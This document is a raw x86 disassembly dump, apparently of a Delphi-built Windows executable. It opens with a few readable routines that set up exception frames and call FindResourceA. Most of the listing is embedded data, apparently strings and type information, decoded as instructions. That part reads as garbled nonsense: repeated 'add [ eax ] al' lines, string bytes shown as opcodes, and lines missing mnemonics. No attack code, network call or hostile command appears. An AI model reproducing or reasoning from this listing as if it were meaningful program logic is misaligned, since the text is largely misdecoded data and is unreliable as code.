mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x40000000
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x40240000
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x40140000
jmp r-xdata
sub_462718
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor edx edx
mov [ ebp - 0x104 ] edx
xor edx edx
push ebp
push sub_4627ac
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x100 ]
xchg edx eax
call sub_40875c
push 0x2
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call FindResourceA
test eax eax
je r-xdata
xor ebx ebx
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404158
mov ecx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4228c8
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4627b3
lea eax [ ebp - 0x104 ]
call sub_403ee8
retn
sub_4627bc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x114 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4628a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
xor eax eax
push ebp
push j_sub_403764
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
push ebp
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
mov eax [ eax ]
call sub_4030e8
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_40414c
mov eax [ ebp - 0x10 ]
call sub_462718
pop ecx
test al al
jne r-xdata
mov [ ebp - 0x9 ] 0x0
push ebp
mov eax [ ebx ]
mov eax [ eax ]
call sub_403124
lea edx [ ebp - 0x110 ]
call sub_4030e8
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x114 ]
call sub_40414c
mov eax [ ebp - 0x114 ]
call sub_462718
pop ecx
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4628a9
lea eax [ ebp - 0x114 ]
call sub_403ee8
lea eax [ ebp - 0x10 ]
call sub_403ee8
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_462870
add [ eax ] eax
add [ eax ] al
jo r-xdata
inc edi
add [ ebp + 0x28 ] dh
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx 0x7e4
call sub_45851c
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_404970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462926
retn
inc eax
add [ eax + ebp + 0x46 ] bh
add al ch
pop ds
adc edx edi
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
mov [ fs : eax ] edx
push sub_4628a9
lea eax [ ebp - 0x114 ]
call sub_403ee8
lea eax [ ebp - 0x10 ]
call sub_403ee8
retn
sub_4628d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46291f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462926
retn
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx 0x7e4
call sub_45851c
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_404970
sub_4629d9
outsb
je r-xdata
dec esi
outsd
je r-xdata
inc eax
add [ esp + ecx * 4 ] ah
inc esi
add [ eax ] bh
inc edi
inc ecx
add [ eax + 0x47 ] al
inc ecx
outsb
imul ebp [ fs : esi + 0x67 ] 0x446f6c0c
jae r-xdata
or al 0x6c
outsd
inc esp
insb
adc al 0x73
insd
jae r-xdata
imul ebp [ fs : esi + 0x67 ] 0x45655408
inc esi
add [ esp + ecx * 4 - 0x745fffba ] ch
inc esi
add [ esp + ecx * 4 + 0x46 ] dl
add [ eax + 0x3c00468c ] al
nop
inc esi
add [ esi ] cl
add [ eax + edx * 4 - 0x7207ffba ] dh
inc esi
add [ esi + ecx * 4 ] bl
inc esi
add al dh
pop [ esi ]
loopne r-xdata
outsb
outsd
outsb
or ebp [ gs : edi + ebp * 2 + 0x41 ]
jae r-xdata
popad
bound esp [ ebp + 0x6c ]
push eax
jb r-xdata
add [ eax - 0x80000000 ] al
add [ eax ] eax
add al 0x4e
dec esp
imul esi [ ebx + 0x74 ] 0x2b04c08b
inc esi
add [ edi ] al
andps xmm0 [ ebx + 0x68 ]
popad
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
add [ eax ] al
inc edx
sub al 0x46
je r-xdata
add [ eax + 0x4d0a0002 ] al
jne r-xdata
add [ eax ] al
push esi
popad
insb
jne r-xdata
jae r-xdata
outsd
je r-xdata
add [ eax ] bl
add [ eax ] al
add [ ebx + ecx + 0x46 ] bh
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
add [ eax ] al
add [ edx + 0x2c ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esi
add [ ecx ] al
dec esp
imul esi [ ebx + 0x74 ] r-xdata
xor [ esi ] bl
inc ecx
add [ 0x65540800 ] al
inc ebp
outsb
imul ebp [ bp + 0x65 ] 0x10000005
inc eax
add [ eax + eax ] al
add bh bh
loopne r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ch
sub al [ esi ]
pop eax
add [ eax ] al
add [ ebp + ebx + 0x33e00041 ] bh
inc eax
add ah ch
xor eax [ eax ]
nop
movsb [ edi ] [ esi ]
sub al [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x2a
inc esi
add [ ebx + ebp ] al
insb
or [ ebx + 0x6d ] esi
jae r-xdata
inc esi
imul esp [ ebp + 0x72 ] r-xdata
sub al 0x0
add bh bh
sub al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add eax 0x6564724f
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x280040 ] ah
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] al
push eax
add [ eax ] al
add [ edi ] cl
push esp
inc ebx
push 0x56747261
popad
insb
jne r-xdata
add [ eax + 0x5400468b ] ah
mov [ esi ] es
or [ esi + eax * 2 + 0x46903c00 ] 0x0
push cs
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44080000 ] al
popad
je r-xdata
imul ebp [ bp + 0x65 ] 0x462aa490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
push esi
popad
insb
jne r-xdata
popad
insd
xchg esp eax
adc [ eax ] al
and [ eax ] al
add bh bh
mov esp 0x100468d
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040001 ] al
adc [ eax ] al
push eax
add [ eax ] al
dec [ eax + edx * 4 + 0x10046 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
or edx [ esi + 0x61 ]
insb
jne r-xdata
jb r-xdata
push esp
imul ebp [ ebp + 0x65 ] r-xdata
sub [ eax ] al
add bh bh
sub [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
sub al [ esi ]
add al 0x2b
or [ ebp + 0x45 ] dl
outsb
imul ebp [ bp + 0x65 ] 0x1000408d
sub al [ esi ]
add ecx [ edi ]
push esp
inc ebx
push 0x4c747261
imul esi [ ebx + 0x74 ] 0x6564724f
jb r-xdata
add [ eax ] eax
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] al
adc al 0x0
add [ eax ] al
andps xmm0 [ ebx + 0x68 ]
popad
push ebx
outsd
jne r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + ebp ] cl
inc esi
add [ esi ] al
insb
outsd
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
or al 0x2a
imul ebp [ edi + 0x6e ] r-xdata
or [ eax ] al
add bh bh
js r-xdata
inc ecx
js r-xdata
jb r-xdata
arpl [ ebp - 0x70 ] sp
and al 0x2c
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
sub al 0x46
add [ eax + 0x2c ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x2d
inc esi
add [ eax + eax ] cl
inc esi
add [ edx ] al
add [ ecx ] 0x0
pop es
jae r-xdata
popad
inc eax
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
popad
jo r-xdata
add [ ebx ] al
add [ eax ] al
jo r-xdata
sub al 0x2d
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0xc0046 ] ch
inc ebp
js r-xdata
adc al 0x0
add bh bh
mov [ ebx + 0x46 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070001 ] al
imul esi [ esp + ebp * 2 + 0x65 ] 0x2c58c08b
inc esi
add [ edi ] al
andps xmm0 [ ebx + 0x68 ]
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] al
pushad
add [ eax ] al
add [ eax + edx + 0x640040 ] ah
add [ eax ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
pop es
je r-xdata
add [ eax ] al
add [ eax ] al
add al ch
sub eax 0x2e180046
inc esi
jo r-xdata
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
add [ eax ] al
inc ecx
js r-xdata
call 0x30466eb4
xor [ eax ] eax
dec esp
xor [ eax ] eax
test [ esi + 0x46 ] cl
add [ eax ] bh
inc edi
outsd
add [ eax + ebx * 2 + 0xe0046 ] ah
insb
push esp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] al
inc esi
imul ebp [ edi + 0x6e ] 0x2d40c08b
inc esi
add [ ebx ] al
andps xmm0 [ ecx + 0x78 ]
imul esi [ ebx + 0x4c ] 0x6c656261
push ebx
je r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add al 0x22
jae r-xdata
outsd
jae r-xdata
inc ecx
add [ eax + 0x47 ] al
add al ch
xor eax [ eax ]
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ esi + ecx * 2 + 0x47380046 ] al
jae r-xdata
adc [ eax ] al
add [ fs : eax ] al
add [ eax ] dl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebp + 0x45 ] dl
outsb
imul ebp [ bp + 0x65 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x184673ce
inc esi
hlt
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
cmp al 0x2d
inc esi
add [ edi ] al
je r-xdata
inc ebx
add [ eax ] cl
push esp
inc ebp
outsb
imul ebp [ bp + 0x65 ] 0x103c0003
inc eax
add [ eax + eax ] cl
add bh bh
and al 0x4b
inc esi
add [ ebx + ecx * 2 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41050000 ] al
outsb
insb
movsb [ edi ] gs : [ esi ]
adc [ eax ] al
imul esi [ esp + ebp * 2 + 0x65 ] r-xdata
call 0x346727d
add [ eax + eax ] 0x10
arpl [ ebp + 0x61 ] cx
js r-xdata
or [ ebp + 0x45 ] dl
test al 0x2e
inc esi
add [ edi ] al
or dl [ ebx + eax * 2 + 0x68 ]
popad
jb r-xdata
add ah ah
add [ eax ] al
add [ ebp + ebx + 0x33e00041 ] bh
inc eax
add ah ch
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ch [ esi ]
inc esi
sbb [ esi ] ch
inc esi
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
inc eax
je r-xdata
inc eax
add al dh
insb
inc ecx
jne r-xdata
add [ ecx ] al
jae r-xdata
js r-xdata
insd
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
inc ecx
js r-xdata
add [ eax + ebx * 2 + 0x540a0046 ] ah
inc ebx
push 0x41747261
js r-xdata
outsd
insd
inc ebx
push 0x41747261
js r-xdata
hlt
insd
inc ebx
push 0x41747261
js r-xdata
dec esi
inc esi
outsd
pop es
je r-xdata
jbe r-xdata
add [ fs : eax ] dl
inc eax
add [ eax ] al
add bh bh
dec esi
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
je r-xdata
popad
insb
jne r-xdata
jae r-xdata
add [ eax ] dl
inc eax
add [ esi ] al
add [ esi ] cl
inc esp
popad
insd
popad
je r-xdata
add [ eax ] al
push es
jae r-xdata
inc ecx
jae r-xdata
inc ecx
inc eax
add al ch
xor eax [ eax ]
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ esi + ecx * 2 + 0x47380046 ] al
insb
dec esi
outsd
outsb
or [ gs : ecx + 0x6c ] dh
push esi
popad
insb
jne r-xdata
or cl [ ecx + 0x62 ]
jb r-xdata
add [ esi ] al
inc ebx
outsb
je r-xdata
dec ecx
push esp
imul ebp [ ebp + 0x65 ] r-xdata
cmp al 0x0
add bh bh
dec esp
dec esi
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47040007 ] al
jae r-xdata
push es
add [ 0x63617845 ] cl
je r-xdata
outsd
jb r-xdata
add [ eax ] al
or [ eax ] al
or al 0x47
jb r-xdata
add [ eax ] al
push esp
imul ebp [ ebp + 0x65 ] 0x6d726f46
popad
je r-xdata
add [ 0x61440e00 ] 0x74
push esp
arpl [ ebp + 0x69 ] cx
outsb
imul ebp [ ebp + 0x75 ] 0x45bd706d
add [ eax ] ch
add [ eax ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x462e ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x17ffb9d2 ] bl
add [ eax ] al
add [ eax - 0x1fffb9d3 ] dl
xor eax [ eax ]
in al dx
xor eax [ eax ]
inc esi
add [ esi + ebp ] dl
inc esi
add [ edi ] ah
add [ eax ] cl
push esp
inc ebp
outsb
imul ebp [ bp + 0x65 ] 0x10000027
inc eax
add [ eax + eax ] al
add bh bh
rcr [ esi + 0x46 ] 0x1
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x75 ] eax
je r-xdata
outsb
imul ebp [ bp + 0x65 ] 0x8c900000
sub eax 0x1e300046
inc ecx
add [ eax ] al
add [ eax ] cl
push esp
inc ebp
add [ eax + 0x47 ] al
inc ecx
cmp [ edi + 0x41 ] al
pop es
je r-xdata
add [ esp + ecx * 2 ] cl
outsd
outsb
je r-xdata
add bh bh
sub [ edx + 0x46 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ edi ] cl
dec esp
popad
bound esp [ ebp + 0x6c ]
jae r-xdata
dec esp
popad
add [ fs : eax ] dl
inc eax
add [ ecx ] al
add bh bh
pushfd
pop esi
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
push es
insb
jae r-xdata
or [ 0x614c0a00 ] 0x62
adc [ eax ] al
inc esp
add [ eax ] al
jmp [ eax ]
jb r-xdata
adc [ eax ] al
lea eax [ eax ]
add bh bh
enter 0x465f 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or [ ecx + 0x6e ] cl
popad
jb r-xdata
add al 0x47
popad
je r-xdata
adc [ eax ] al
push 0x28ff0000
bound eax [ esi ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
add [ eax + 0x41040003 ] al
insd
popad
je r-xdata
add [ eax ] bh
inc edi
insb
dec ebp
popad
jb r-xdata
insb
outsb
inc ecx
js r-xdata
adc [ eax ] al
push 0x0
insb
jae r-xdata
jne r-xdata
bound esp [ ebp + 0x6c ]
jae r-xdata
outsb
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
xchg esp eax
adc [ eax ] al
or [ eax ] al
add bh bh
push 0x1004662
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49090009 ] al
adc [ ecx + 0x75 ] al
je r-xdata
je r-xdata
adc [ eax ] al
add [ fs : eax ] al
call [ ecx + edx * 2 + 0x10046 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x61440e00
add [ eax ] eax
add [ eax ] al
jae r-xdata
js r-xdata
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x41
arpl [ eax ] ax
adc [ eax ] al
add eax 0x2cff0000
pop edi
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] eax
add [ eax ] al
imul edi [ edx + 0x65 ] r-xdata
pop eax
add [ eax ] al
adc al [ eax ]
or cl [ ecx + 0x62 ]
insb
push ebx
je r-xdata
jae r-xdata
add [ eax ] dl
jo r-xdata
jae r-xdata
add [ eax ] al
je r-xdata
adc [ ecx + 0x75 ] al
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
push [ edi + ebx * 2 + 0x5f5c0046 ]
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41100004 ] al
inc ecx
add [ eax ] dl
insd
popad
je r-xdata
add [ eax ] al
dec [ ebx ]
inc esi
add ah cl
push ebp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d070016 ] al
inc eax
add [ eax ] ah
add [ eax ] al
dec [ eax + 0x60 ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
insb
add [ gs : eax ] dl
adc [ eax ] eax
or cl [ ecx + 0x62 ]
insb
add [ eax ] al
adc [ eax ] al
push eax
add [ eax ] al
inc [ ecx + 0x10046 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
adc [ eax ] al
adc [ ecx + 0x62 ] cl
imul ebp [ esi + 0x69 ] 0x846d756d
mov edx 0x6c0045
add bh bh
pop eax
dec esi
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d090017 ] al
imul ebp [ esi + 0x6f ] 0x69724772
cmp al 0x10
inc eax
add [ eax ] dh
add bh bh
in al 0x64
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sbb [ eax ] al
push cs
dec ebp
imul ebp [ esi + 0x6f ] 0x63695472
imul eax [ ebx + 0x6f ] 0x75
outsb
je r-xdata
push ss
je r-xdata
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
popad
bound esp [ ebp + 0x6c ]
jae r-xdata
dec esp
imul ebp [ esi + 0x65 ] r-xdata
dec esp
add [ eax ] al
call [ edx ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
str [ esp + ecx * 2 ]
add [ eax ] 0x0
add [ eax + 0x4d0a001a ] al
imul ebp [ esi + 0x6f ] 0x63695472
imul esi [ ebx - 0x6c ] 0x10
inc eax
add [ eax - 0x4b010000 ] bl
push ecx
inc esi
add [ eax ] cl
dec edi
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530d001b ] al
je r-xdata
adc [ eax ] al
je r-xdata
add [ edi ] al
dec ebp
insd
imul esp [ ebx + 0x3c ] 0x24004010
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or ecx [ edi + ebp * 2 + 0x67 ]
popad
je r-xdata
call [ edx + edx * 2 ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
jb r-xdata
add bh bh
shl [ esi + eax * 2 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
sbb [ eax ] eax
cmovge ebp [ ecx + 0x6e ]
outsd
jb r-xdata
jb r-xdata
popad
outsd
outsb
cmp al 0x10
inc eax
add [ eax + eax ] dl
add [ eax ] eax
inc esi
imul esi [ edx + 0x73 ] 0x62614c74
insb
cmp al 0x10
inc eax
add [ eax + eax + 0x64f8ff00 ] al
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
outsd
jne r-xdata
push eax
outsd
jae r-xdata
outsd
outsb
xchg esp eax
adc [ eax ] al
mov al [ 0xffffffffd4ff0000 ]
push ecx
inc esi
add [ edi + ecx * 2 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x450b001c ] al
imul esp [ ebx + 0x6b ] 0x676e654c
je r-xdata
[ eax + 0x1004651 ]
outsb
insb
jns r-xdata
popad
bound esp [ ebp + 0x6c ]
jae r-xdata
outsb
je r-xdata
add [ edi ] cl
push edx
add [ eax ] al
je r-xdata
add [ eax ] al
je r-xdata
outsb
push eax
outsd
jae r-xdata
inc ebp
or al 0xbc
inc ebp
add [ eax ] bh
add bh bh
xor al 0x4e
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54050022 ] al
imul esp [ ebx + 0x6b ] 0x45bc0c73
add [ eax + 0x40ff0000 ] al
mov esp 0x7c0045
add bh bh
sub [ esi + 0x46 ] cl
add [ ecx ] al
and al [ eax ]
add eax 0x6b636954
jae r-xdata
cmp al 0x10
inc eax
add [ eax - 0x43010000 ] cl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ eax ] ah
add [ edx ] cl
push esp
imul esp [ ebx + 0x6b ] 0x676e654c
je r-xdata
add [ esi ] bl
add [ eax ] 0x0
add [ eax ] al
pop ds
add [ edi ] cl
push esp
imul esp [ ebx + 0x6b ] 0x656e6e49
jb r-xdata
outsd
outsb
xchg esp eax
adc [ eax ] al
test al 0x0
add bh bh
hlt
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xe0656c62
xor al 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor eax 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
xor al 0x46
add al ch
add [ eax ] al
add [ eax - 0x1fffb9d3 ] dl
xor eax [ eax ]
in al dx
xor eax [ eax ]
sub al 0x46
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540a0023 ] al
imul esp [ ebx + 0x6b ] 0x6e6e4973
dec esi
inc esi
add [ ecx ] al
mov esp 0x800045
add bh bh
inc eax
jb r-xdata
arpl [ ebx + 0x73 ] bp
dec ecx
outsb
outsb
add [ eax ] al
and [ eax ] eax
adc [ ecx + ebp * 2 + 0x63 ] dl
imul ecx [ edi + 0x6e ] 0x4c
add [ eax ] dl
inc eax
add [ eax + eax + 0x523cff00 ] cl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
sub_464404
sahf
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50060002 ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add ah al
inc esp
inc esi
add [ eax ] dl
add [ eax ] al
add [ esp + ebx + 0x33e00041 ] cl
inc eax
add ah ch
xor eax [ eax ]
outsd
aam 0x42
inc esi
add [ ecx ] bh
add [ eax ] al
[ eax - 0x61 ]
sub_464426
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
or edx [ eax + 0x65 ]
jb r-xdata
call 0x304684dc
xor [ eax ] eax
dec esp
xor [ eax ] eax
int3
outsd
inc ecx
insb
imul esp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
js r-xdata
sub [ ecx ] eax
add eax 0x65540800
inc ebp
outsb
imul ebp [ bp + 0x65 ] 0x10940003
inc eax
add [ eax ] dh
add [ eax ] al
jmp eax
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x65 ]
jb r-xdata
je r-xdata
outsd
push ebx
je r-xdata
jae r-xdata
popad
insb
jne r-xdata
dec esp
outsb
push esp
js r-xdata
insb
mov ah 0x44
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
inc esp
inc esi
add [ eax ] dl
add [ eax ] al
add [ esp + ebx + 0x33e00041 ] cl
inc eax
add ah ch
xor eax [ eax ]
inc edi
je r-xdata
push 0x72655074
dec esp
imul esi [ ebx + 0x74 ] r-xdata
fadd [ esi + eax * 2 ]
add edx [ eax ]
push esp
inc esi
add [ eax + 0x47 ] al
add [ eax ] al
add ah ch
inc esi
inc esi
push ebx
je r-xdata
or [ ecx ] al
add [ eax ] al
loopne r-xdata
jb r-xdata
or [ ebp + 0x45 ] dl
outsb
imul ebp [ bp + 0x65 ] 0xa000408d
inc ebp
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
inc edi
inc edi
inc esi
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0xffffffffd8000000 ] al
inc esp
inc esi
add [ eax ] cl
insb
je r-xdata
inc esi
add [ ecx + eax * 8 - 0x3287ffba ] dl
add [ ebx + ebx * 4 ] dl
inc ecx
add al al
mov eax [ 0x33ec0041 ]
inc eax
inc esi
add [ eax ] bh
inc edi
inc ecx
add [ eax - 0x5e ] al
inc eax
add al ch
xor eax [ eax ]
xor [ ecx ] dh
outsb
je r-xdata
inc ecx
add [ eax - 0x27ffbe61 ] ch
mov eax [ 0xffffffff9ec00041 ]
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0xffffffff9fb00041 ]
inc esi
add [ edi + ebp * 4 - 0x4f7bffba ] ah
inc esi
add [ eax ] ah
mov bl 0x46
add [ eax ] bl
mov [ esi ] 0x58
scasd [ edi ]
inc esi
add ah cl
mov ah 0x46
add [ eax - 0x53ffb94c ] ch
mov ah 0x46
add [ ebp + 0x46 ] bh
add [ edi + esi * 4 ] bl
inc esi
add [ eax + 0x400046ae ] bl
lds eax [ esi ]
cld
les eax [ esi ]
int3
sahf
pop eax
push esi
popad
insb
jne r-xdata
push eax
insb
popad
imul ebp [ esi + 0xc ] 0x4c73746c
je r-xdata
or [ esp + esi * 2 + 0x73 ] ebp
insb
je r-xdata
add [ eax ] cl
mov [ 0xffffffff9eb00046 ] al
int 0x46
add [ edi + eax * 2 + 0x46 ] dl
popad
insb
jne r-xdata
inc esi
mov [ 0xffffffffc1940046 ] al
inc esi
add [ eax - 0x33 ] bh
arpl [ ebp + 0x6e ] sp
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x72655074
inc esi
add [ eax ] cl
add [ eax ] eax
add al ah
sub [ ecx ] al
shl [ ecx + 0x33ec0041 ] 0x40
or eax 0x5273746c
imul esp [ edi + 0x68 ] 0x6c615674
jne r-xdata
inc ecx
add ah dh
xor eax [ eax ]
call 0x304685c8
xor [ eax ] eax
dec esp
xor [ eax ] eax
sub al 0xce
in al dx
xor eax [ eax ]
adc al 0x9b
push cs
insb
je r-xdata
inc eax
add [ ecx + esi + 0x40 ] cl
add [ esi + ecx * 8 ] ch
dec esp
sub_464816
